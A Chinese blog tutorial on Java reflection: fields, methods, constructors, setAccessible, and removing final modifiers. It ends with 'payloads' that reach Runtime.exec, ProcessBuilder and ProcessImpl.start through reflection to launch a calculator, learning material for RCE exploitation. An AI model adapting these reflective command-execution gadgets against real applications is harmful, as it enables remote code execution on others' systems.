获取成员变量Field，位于java.lang.reflect.Field中，常使用的方法有如下几种\nField[] getFields()：获取所有public修饰的成员变量（包括父类） Field[] getDeclaredFields()：获取所有的成员变量，不考虑修饰符（不包括父类） Field getField(String name)：获取指定名称的public修饰的成员变量（包括父类） Field getDeclaredField(String name)：获取指定的成员变量（不包括父类） 获取字段 还是利用之前那个demo来演示一下\nReflection.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; public class Reflection { private String name; protected String sex; public int age = 222; public int getAge(){ return this.age; } public void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Field[] field = clazz.getDeclaredFields(); for(Field x : field){ System.out.println(x); } System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1); System.out.println(field1.getName()); System.out.println(field1.getType()); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2); System.out.println(field2.getName()); System.out.println(field2.getType()); } } //对于数组类型的需要使用for循环来便利输出 输出为：\n1 2 3 4 5 6 7 8 9 10 11 private java.lang.String java_foundation.Reflection.name protected java.lang.String java_foundation.Reflection.sex public int java_foundation.Reflection.age ============== protected java.lang.String java_foundation.Reflection.sex sex class java.lang.String ============== public int java_foundation.Reflection.age age int 我们还需要了解的是一个Field对象包含了一个字段的所有信息，可以使用如下函数获取\ngetName()：返回字段名称 getType()：返回字段类型，也是一个Class实例 getModifiers()：返回字段修饰符 get(obj)：获取字段值 set：修改字段值 这时再看上面给的代码，就可以知道不使用getName()直接输出就可以获取到变量的修饰符以及类型。\n获取字段值 这里就需要用到get(obj)，直接看代码。\n这里将Reflection.java稍微改改\n1 2 3 4 5 6 7 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); System.out.println(field3.get(clazz.newInstance())); } } 输出为：\n1 2 3 4 5 6 7 8 9 10 11 ============== boy ============== 222 ============== Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalAccessException: Class java_foundation.Main can not access a member of class java_foundation.Reflection with modifiers \u0026#34;private\u0026#34; at sun.reflect.Reflection.ensureMemberAccess(Reflection.java:102) at java.lang.reflect.AccessibleObject.slowCheckMemberAccess(AccessibleObject.java:296) at java.lang.reflect.AccessibleObject.checkAccess(AccessibleObject.java:288) at java.lang.reflect.Field.get(Field.java:390) at java_foundation.Main.main(Main.java:19) 这里可以看到private字段抛出错误，可以调用Field.setAccessible(true)，更改代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field3.setAccessible(true); System.out.println(field3.get(clazz.newInstance())); } } /* ============== boy ============== 222 ============== fupanc */ 修改字段值 基本格式：\n1 2 Field f = stdClass.getDeclaredField(\u0026#34;grade\u0026#34;); f.set(obj, \u0026#34;xxxx\u0026#34;); 这样基本就懂了，这里的obj就是一个实例，需要注意：对于private修饰的字段修改方法，同样需要调用Field.setAccessible(true)来使其可访问。测试代码如下： Main.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Object o = clazz.newInstance();//实例化对象 System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(o)); System.out.println(\u0026#34;修改后的内容：\u0026#34;); field1.set(o,\u0026#34;girl\u0026#34;); System.out.println(field1.get(o)); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(o)); System.out.println(\u0026#34;修改后的内容：\u0026#34;); field2.set(o,1111); System.out.println(field2.get(o)); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field3.setAccessible(true);//注意反射还是需要调用这个 System.out.println(field3.get(o)); System.out.println(\u0026#34;修改后的内容：\u0026#34;); field3.set(o,\u0026#34;hahaha\u0026#34;); System.out.println(field3.get(o)); } } 输出为：\n1 2 3 4 5 6 7 8 9 10 11 12 ============== boy 修改后的内容： girl ============== 222 修改后的内容： 1111 ============== fupanc 修改后的内容： hahaha 注意看代码，这里为什么要实例化一个对象赋值给一个变量，而不是像上面获取字段值那样直接用ctf.newInstance()直接来代表obj，可以先自己想想😈，现在给出解释：\n重点其实还是理解代码，这里调用了两次o，也就是调用了两次对象。如果我们两个地方都使用ctf.newInstance()，那么就会实例化两次，也就是会让前面输出和后面修改的对象是不一致的。所以需要使用一个o来代表这是同一个对象，从而输出修改后的结果。不要小看这一个小小的问题哦\n修改final关键字修饰的成员变量 这里单独拿出来说是因为final关键字修饰的特性，被final关键字修饰的变量表明其数值在初始化之后就不能再更改，并且需要在定义这个字段时就声明值，并且是不能通过设置setter方法来修改，如下代码说明：\n1 2 3 4 5 6 class Something{ private final String name = \u0026#34;fupanc\u0026#34;; public void setName(String name){ this.name = name; } } 此时就会报错： 无法将值赋给 final 变量 \u0026rsquo;name\u0026rsquo;。\n然后按照我的理解，其实前面的set()和get()方法其本质就是setter和getter方法。所以这里该怎么修改呢？\n按照下面套就行，注意需要导入java.lang.reflect.Modifier：\n1 2 3 4 5 6 7 8 9 10 11 // 反射获取Field类的modifiers Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); // 设置modifiers修改权限 modifiers.setAccessible(true); // 修改成员变量的Field对象的modifiers值（像是移除final修饰符） modifiers.setInt(field, field.getModifiers() \u0026amp; ~Modifier.FINAL); // 修改成员变量值 field.set(类实例对象, 修改后的值); 实例使用如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package java_foundation; import java.lang.reflect.Modifier; import java.lang.reflect.Field; public class Text { public static void main(String[] args) throws Exception { Something o = new Something(); Class clazz = Class.forName(\u0026#34;java_foundation.Something\u0026#34;); Field field = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field.setAccessible(true); System.out.println(field.get(o)); Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiers.setAccessible(true); modifiers.setInt(field,field.getModifiers() \u0026amp; ~Modifier.FINAL); field.set(o,\u0026#34;hahaha\u0026#34;); System.out.println(field.get(o)); } } class Something{ private final String name = \u0026#34;fupanc\u0026#34;; public String getName(){ return this.name; } } /* fupanc hahaha */ 这样就可以修改User类中的private和final属性的name值\n获取类的方法 想要创建Method需要导包，位于java.lang.reflect.Method下，常使用的方法如下：\n1 2 3 4 5 Method getMethod(name,Class...)：获取某个public的Method（包括父类） Method getDeclaredMethod(name,Class...)：获取当前类的某个Method（不包括父类） //第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型 Method[] getMethods()：获取所有public的Method（包括父类） Method[] getDeclaredMethods()：获取当前类的所有Method（不包括父类） 同样的一个Method对象包含一个方法的所有信息：\ngetName()：返回方法名称 getReturnType()：返回方法返回值类型，也是一个Class实例 getParameterTypes()：返回方法的参数类型，是一个Class数组 getModifiers()：返回方法的修饰符 获取方法 直接给代码看如何利用,为了凸显结果方便理解，这里改一下Reflection.java的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; public int getAge(){ return this.age; } private void setAge(int age){ this.age = age; } protected void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; import java.lang.Class; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Method[] method = clazz.getDeclaredMethods(); for(Method x:method){ System.out.println(x); } System.out.println(\u0026#34;==============\u0026#34;); Method method1 = clazz.getDeclaredMethod(\u0026#34;setAge\u0026#34;,int.class); System.out.println(method1.getName()); System.out.println(method1.getReturnType()); } } 输出为：\n1 2 3 4 5 6 7 public java.lang.String java_foundation.Reflection.getName() protected void java_foundation.Reflection.setName(java.lang.String) private void java_foundation.Reflection.setAge(int) public int java_foundation.Reflection.getAge() ============== setAge void 这里需要注意的就是对于不同修饰符修饰的方法在获取时使用的方法的不同，但其实一般都是使用的Declared那类方法。\n调用方法 invoke()：调用方法。\ninvoke的作用是执行方法，需要两个参数，第一个参数是：\n如果这个方法是一个普通方法，那么第一个参数是类对象 如果这个方法是一个静态方法，那么第一个参数是类 第二个参数是这个方法的需要传入的参数。\n这里需要注意一点，在调用方法这里与获取成员变量差不多，private修饰符，需要通过Method.setAccessible(true)允许其调用。\n先简单给代码看看\nReflection.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; public int getAge(){ return this.age; } private void setAge(int age){ this.age = age; } protected void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package java_foundation; import java.lang.Class; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Object o = clazz.newInstance(); Method method1 = clazz.getDeclaredMethod(\u0026#34;setAge\u0026#34;,int.class); method1.setAccessible(true); //需要允许访问 method1.invoke(o,123); Method method2 = clazz.getDeclaredMethod(\u0026#34;getAge\u0026#34;); System.out.println(method2.invoke(o)); Method method3 = clazz.getDeclaredMethod(\u0026#34;setName\u0026#34;,String.class); method3.invoke(o,\u0026#34;hahaha\u0026#34;); Method method4 = clazz.getDeclaredMethod(\u0026#34;getName\u0026#34;); System.out.println(method4.invoke(o)); } } /* 123 hahaha */ 可以看出成功调用了setName/setAge方法并设置了name/age的值，可以自己再调试一下，这里只有private修饰的方法才需要调用setAccessible(true)，注意看代码之间的联系。\n稍微说明一下静态方法的利用方式，如下格式：\n1 2 3 4 5 6 7 8 Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(Runtime.class); r.exec(\u0026#34;calc\u0026#34;); 同样的可以使用 Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(null); r.exec(\u0026#34;calc\u0026#34;); //getRuntime()方法是静态方法，这样就可以直接执行方法从而获取Runtime类的实例化对象 这是反射API知道静态方法不需要实例对象，因此invoke方法的第一个参数（对象实例）可以是null或类对象，反射API会自动处理并忽略它。注意理解上面的格式。\n获取构造函数Constructor 获取构造函数Constructor，位于java.lang.reflect.Constructors中，常使用的方法有：\nConstructor[] getConstructors()：只返回public构造函数 Constructor[] getDeclaredConstructors()：返回所有构造函数 Constructor getConstructor(Class\u0026hellip;)：匹配和参数配型相符合的public构造函数 Constructor getDeclaredConstructor(Class\u0026hellip;)：匹配和参数配型相符的构造函数 Reflection.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; public class Reflection { private String name; public int age; public Reflection(){ System.out.println(\u0026#34;调用无参构造函数\u0026#34;); } public Reflection(String name){ System.out.println(\u0026#34;调用有参构造函数\u0026#34;+name); } private Reflection(int age){ this.age=age; System.out.println(\u0026#34;调用私有构造函数\u0026#34;+age); } public int getAge(){ return this.age; } } Main.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package java_foundation; import java.lang.Class; import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Constructor[] constructor = clazz.getDeclaredConstructors(); for(Constructor x:constructor){ System.out.println(x); } System.out.println(\u0026#34;===============\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(String.class); System.out.println(constructor1); //简单利用，实例化对象： constructor1.newInstance(\u0026#34;fupanc\u0026#34;); System.out.println(\u0026#34;===============\u0026#34;); Constructor constructor2 = clazz.getDeclaredConstructor(int.class); System.out.println(constructor2); constructor2.setAccessible(true); Reflection o = (Reflection)constructor2.newInstance(12345); System.out.println(o.getAge()); } } 输出为：\n1 2 3 4 5 6 7 8 9 10 private java_foundation.Reflection(int) public java_foundation.Reflection(java.lang.String) public java_foundation.Reflection() =============== public java_foundation.Reflection(java.lang.String) 调用有参构造函数fupanc =============== private java_foundation.Reflection(int) 调用私有构造函数12345 12345 调用private修饰的Constructor时，必须首先通过setAccessible(true)设置允许访问。\n获取继承关系 获取父类\n1 Class.getSuperclass() 获取interface\n1 Class.getInterface() 反射创建类对象 其实这个已经在前面代码的示例中已经利用过滤，只要把前面代码看懂这个板块就没有问题。直接给代码：\n1 2 Class ctf = Class.forName(\u0026#34;Main\u0026#34;); // 创建Class对象 Main o = (Main)ctf.newInstance(); // 创建类对象 则o就是对应的类对象。\n这里调用的这个类的无参构造函数，但是不一定可以使用成功，原因可能为：\n使用的类没有无参构造函数 使用的类构造函数是私有的 注意如果没有无参构造方法，可以使用Constructor.newInstance()来实例化一个类对象。如下：\n1 2 3 4 5 //public Main(String name)作为构造函数： Class clazz = Class.forName(\u0026#34;Main\u0026#34;); clazz.getMethod(\u0026#34;setName\u0026#34;,String.class).invoke(clazz.getConstructor(String.class).newInstance(\u0026#34;admin\u0026#34;),\u0026#34;haha\u0026#34;); //当没有权限访问时可以调用constructor.setAccessible(true)来创建出类实例 利用反射进行命令执行 利用Runtime类 java.lang.Runtime 中有一个exec方法可以执行本地命令，但是不能如下直接构造来执行命令：\n1 2 3 4 5 6 7 8 9 10 11 12 import java.lang.reflect.*; public class Text { public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method method1 = ctf.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); method1.invoke(ctf.newInstance(),\u0026#34;id\u0026#34;); } } //中间代码可以简化如下，并且不需要导包，需要注意一下： Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); ctf.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(ctf.newInstance(), \u0026#34;id\u0026#34;); 这样会报错\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalAccessException: class Text cannot access a member of class java.lang.Runtime (in module java.base) with modifiers \u0026#34;private\u0026#34; at java.base/jdk.internal.reflect.Reflection.newIllegalAccessException(Reflection.java:361) at java.base/jdk.internal.reflect.Reflection.ensureMemberAccess(Reflection.java:99) at java.base/java.lang.Class.newInstance(Class.java:579) at Text.main(Text.java:5) 原因就是Runtime类的构造方法是私有的，导致这样ctf.newInstance()直接调用是错误的。\n可以看一下源码\n可以看到有一个getRuntime()方法可以获取到对象，这种设计就是“单例模式”，这里可以使用一个静态方法来获取对象，所以在这里我们只能通过Runtime.getRuntime()来获取到Runtime对象。\n这里Runtime.getRuntime()是一个静态方法，所以在使用invoke执行方法时，第一个参数需要传入一个Runtime类,所以可以将代码改成如下来执行：\n1 2 3 4 5 6 7 8 9 10 11 package java_foundation; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Class clazz = Runtime.class; clazz.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class).invoke(clazz.getDeclaredMethod(\u0026#34;getRuntime\u0026#34;).invoke(null),\u0026#34;calc\u0026#34;); } } //成功弹出计算机 还可以通过setAccessible(true)获得访问权限，全反射调用的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import java.lang.reflect.*; public class Text{ public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor constructor1 = ctf.getDeclaredConstructor(); constructor1.setAccessible(true); Object o = constructor1.newInstance(); Method method1 = ctf.getMethod(\u0026#34;getRuntime\u0026#34;); Object x = method1.invoke(o); Method method2 = ctf.getMethod(\u0026#34;exec\u0026#34;,String.class); method2.invoke(x,\u0026#34;calc\u0026#34;); } } 最后虽然弹出警告但是成功弹出计算机\n1 2 3 4 5 WARNING: An illegal reflective access operation has occurred WARNING: Illegal reflective access by Text (file:/D:/java_text/java-1/out/production/java-1/) to constructor java.lang.Runtime() WARNING: Please consider reporting this to the maintainers of Text WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations WARNING: All illegal access operations will be denied in a future release 其实直接如下利用即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.Class; import java.lang.reflect.Constructor; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Runtime rt = (Runtime)constructor.newInstance(); rt.exec(\u0026#34;calc\u0026#34;); } } 但是上面的全利用反射来利用还是需要学习一下。\n其他类与方法利用 现在直接使用Runtime.getRuntime().exec(cmd)的调用其实已经不太好找了，在这里看到了一篇文章，也是拓展了我的思路，这里我们还可以通过跟进Runtiem类的exec()方法的底层调用过程来完成RCE功能的实现。\n现在还是来调试一下，看看这里的底层实现以及自己构建代码。\n基本测试类：\nMain.java：\n1 2 3 4 5 6 7 8 9 10 package java_foundation; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Runtime rt = Runtime.getRuntime(); rt.exec(\u0026#34;calc\u0026#34;); } } 运行成功弹出计算机。\n调试过程 跟进代码中的exec()方法，然后打断点：\n开始调试：\n然后调用了重载的exec()方法：\n又调用了重载的exec()方法：\n然后这里就实例化了一个方法来执行这个过程。在这里我调试时发现其实这里直接return这个ProcessBuilder类后直接就弹出了计算机，说明其实这里就是一个可以直接进行命令执行的地方。所以这里就有一个可以利用的点，直接根据这里的点来构造一个简单的payload，第一构造点了，但是后面再说明。这里继续跟代码：\n然后就是实例化了ProcessBuilder类：\n可以看出来这个command是一个数组类型的值，并且这里add过后的值也可以调试看一下：\n。继续往后面走，调用了environment()方法：\n这里其实就是直接返回的前面的ProcessBuilder类实例，没有其他操作。\n然后调用了directory()方法：\n一个简单的赋值操作，然后返回了ProcessBuilder类实例。\n最后调用了start()方法：\n代码逻辑简单跟一下，还是能看懂，主要调用的就是下面的ProcessImpl类的start()方法，并且这里在执行这个方法后弹出计算机，所以这里也是第二个构造点。现在还是不谈，后面再具体分析。\n在这里就是调用了ProcessImpl类的start()方法，这里看一下ProcessImpl类的start()方法的定义：\n就是这个static修饰符，让这个start()方法可以直接被调用。那么现在再继续跟进这里的start()方法，参数传递情况：\n简单跟了一下，其实最后调用的还是如下代码：\n调试过后发现这里也是直接实例化这个过程然后弹出计算机，这里的参数传递：\n所以这里又是第三构造方法。（感觉其实这里都是一层套一层，主要是参数的传递吧）。\n再继续跟进，现在来到了ProcessImpl类的初始化过程：\n所以会进入第一个if语句，就是将allowAmbiguousCommands设置为true，以及value最终值为null，然后就退出第一个if条件，随后正好就进入了第二个if条件，这里就不细跟第二个if条件了，最后退出这个if条件，将调用create()方法：\n当跳过这个create()方法就弹出计算机，说明这里也是可以利用的，第四构造点。那么现在继续跟进这个create()方法，但是一直跟不进去，alt+shift+F7强制步入也进不了。简单跟进是对应的如下方法：\n上面也是有方法说明的，大概意思就是会使用win32函数来创建进程，这里就有点太底层了。并由由于操作系统的不同，这分析出来的主要是windows系统下，对于linux系统下的利用也就会有不同，不再往下跟了。\n总结一下前面的几个构造点：\nnew ProcessBuilder(cmdarray).environment(envp).directory(dir).start() ProcessImpl类的start()方法。 大概就是这两个，因为linux和windows两个操作系统的不同，在第三个构造点就开始有不同代码了，如果是打linux环境也许还有更多的paylaod，这个就到时候再具体跟吧。这里就只说明这两个方法，具体区别可以看一下参考文章。\n利用ProcessBuilder 对应代码：\njava.lang.ProcessBuilder类用于创建操作系统进程， 还是调试代码看需要哪些参数：\n首先就是新建了ProcessBuilder类实例，重点是注意参数类型以及参数的传递，先是实例化了ProcessBuilder类：\n然后将这个command变量设置为了一个数组类型的变量。\n然后调用了environment()方法，但是没啥用，其实就是将ProcessBuilder类的environment变量设置为null。\n然后调用了directory()方法，同样其实就是一个将ProcessBuilder类的directory变量设置为null。\n最后调用了start()方法完成命令的执行。\n但是其实对于中间两个变量的设置，其实在ProcessBuilder类初始化后就已经符合条件了：\n所以其实只用获取构造器和start()方法即可。但这里要说明一个点：Java中的可变长参数，当定义函数的时候不确定参数数量的时候，可以使用...这样的语法来表示”这个函数的参数个数是可变的“。同时对于可变长参数，Java在编译时会编译成一个数组，所有说下面这两种写法在底层其实是等价的：\n1 2 public void hello(String[] names){} public void hello(String...name){} 对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。\n那么可以如下构造paylaod：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; public class MyTest { public static void main(String[] args) throws Exception{ String[] cmd = new String[]{\u0026#34;calc\u0026#34;}; String className = \u0026#34;java.lang.ProcessBuilder\u0026#34;; Class clazz = Class.forName(className); Constructor constructor = clazz.getDeclaredConstructor(String[].class); Method method = clazz.getDeclaredMethod(\u0026#34;start\u0026#34;,null); method.invoke(constructor.newInstance(cmd)); } } 但是报错：\n1 2 3 4 5 6 Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalArgumentException: argument type mismatch at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:422) at java_foundation.MyTest.main(MyTest.java:13) 也算积累经验了，一直在看语法，结果问报错一下就解决了，这里的基本的大部分语法是没有错误的，主要还是可变参数的原因。即ProcessBuilder类的构造函数：\n这里就直接继承一个固定的吧，也就是说。我在反射时获取了正确的构造函数String[].class，但是在实例化时有区别，主要是因为 可变参数 (varargs) 和 数组类型 在 Java 反射中的处理方式稍微不同。就是在调用newInstance()方法时，Java会将可变参数视为一个Object[]类型，而不是直接的String[]。所以这里需要强制类型转换为Object类型。所以正确的利用方法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //原利用思路：new ProcessBuilder(new String[]{\u0026#34;calc\u0026#34;}).start(); package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; public class MyTest { public static void main(String[] args) throws Exception{ String[] cmd = new String[]{\u0026#34;calc\u0026#34;}; String className = \u0026#34;java.lang.ProcessBuilder\u0026#34;; Class clazz = Class.forName(className); Constructor constructor = clazz.getDeclaredConstructor(String[].class); Method method = clazz.getDeclaredMethod(\u0026#34;start\u0026#34;,null); method.invoke(constructor.newInstance((Object)cmd)); } } 成功弹出计算机，并且只使用反射的条件。还可以如下进行说明传参：\n我们将字符串数组的类String[].class传给getConstructor即可，此时就获取到了参数为数组类型的newInstance()，在调用newInstance的时候，因为本身接收的是一个可变长参数（即一个数组），并且需要我们传给 ProcessBuilder构造器的参数的是一个List\u0026lt;String\u0026gt;类型，二者叠加为一个二维数组,最终payload如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import java.lang.reflect.*; public class Text{ public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); Constructor constructor1 = ctf.getConstructor(String[].class); Object o = constructor1.newInstance(new String[][]{{\u0026#34;calc\u0026#34;}}); Method method1 = ctf.getMethod(\u0026#34;start\u0026#34;); method1.invoke(o); } } /*中间代码精简： Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ctf.getMethod(\u0026#34;start\u0026#34;).invoke(ctf.getConstructor(String[].class).newInstance(new String[][]{{\u0026#34;calc\u0026#34;}})); 说一点点代码：\n对于new String[][]{{\u0026quot;calc\u0026quot;}}：这里使用 new 关键字创建并初始化一个二维字符串数组，确保参数类型正确匹配 。 然后在其他文章中看到了另外一个有意思的paylaod，直接看吧：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.List; import java.util.Arrays; public class MyTest { public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); Constructor constructor1 = ctf.getConstructor(List.class); Object o = constructor1.newInstance(Arrays.asList(\u0026#34;calc\u0026#34;)); Method method1 = ctf.getMethod(\u0026#34;start\u0026#34;); method1.invoke(o); } } /*成功弹计算机 中间代码精炼一下就是（这样就不用导lang下的包）： Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ctf.getMethod(\u0026#34;start\u0026#34;).invoke(ctf.getConstructor(List.class).newInstance(Arrays.asList(\u0026#34;calc\u0026#34;))); 这里主要就是利用的另外一个构造函数来构造的payload：\n因为这两个构造函数其实最后都是直接作用与它的command变量，也就是我们要传入的命令，这里同样可以通过获取相应的构造函数并传入相应的值来执行命令。具体就看上面的代码了，不多赘述。\nProcessImpl#start() 对应代码：\n这里其实就是对应的ProcessBuilder类调用的start()方法，也就是前一个调用方法的更深一层但是这里对应的类是不一样的，所以可以利用。\n对于这里直接调用的ProcessImpl类的start()方法，这里是因为这个类的start()方法是一个静态方法，同样直接打就行了，对应的参数传递情况：\n所以直接打就行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package java_foundation; import java.lang.reflect.Method; import java.util.Map; public class MyTest { public static void main(String[] args) throws Exception{ String name = \u0026#34;java.lang.ProcessImpl\u0026#34;; String[] cmd = {\u0026#34;calc\u0026#34;}; Method method = Class.forName(name).getDeclaredMethod(\u0026#34;start\u0026#34;, String[].class, Map.class,String.class, ProcessBuilder.Redirect[].class, boolean.class); method.invoke(null,cmd,null,null,null,false); } } 报错：\n1 2 3 Exception in thread \u0026#34;main\u0026#34; java.lang.NoSuchMethodException: java.lang.ProcessImpl.start([Ljava.lang.String;, java.util.Map, java.lang.String, java.lang.ProcessBuilder$Redirect, boolean) at java.lang.Class.getDeclaredMethod(Class.java:2130) at java_foundation.MyTest.main(MyTest.java:10) 虽然这个start()方法没有定义为私有类型：\n但是这个start()方法所处的ProcessImpl类是final类型的的，并且都不能直接import引入，所以需要通过setAccessible(true);来让其可以访问。\n所以最终代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.reflect.Method; import java.util.Map; public class MyTest { public static void main(String[] args) throws Exception{ String name = \u0026#34;java.lang.ProcessImpl\u0026#34;; String[] cmd = {\u0026#34;calc\u0026#34;}; Method method = Class.forName(name).getDeclaredMethod(\u0026#34;start\u0026#34;, String[].class, Map.class,String.class, ProcessBuilder.Redirect[].class, boolean.class); method.setAccessible(true); method.invoke(null,cmd,null,null,null,false); } } 成功弹出计算机。\n这里只分析了通用的两个payload，对于linux环境当然还可以打其他的方式，具体看参考文章。\n参考文章：\nhttps://www.cnblogs.com/Nestar/p/17335689.html\nhttps://xz.aliyun.com/t/12446?time__1311=GqGxRQ0%3DitqiqGN4eeT4QwqWqrvD9BjiZaoD\n","date":"2025-01-22T12:38:15+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/","title":"Java反射机制"}]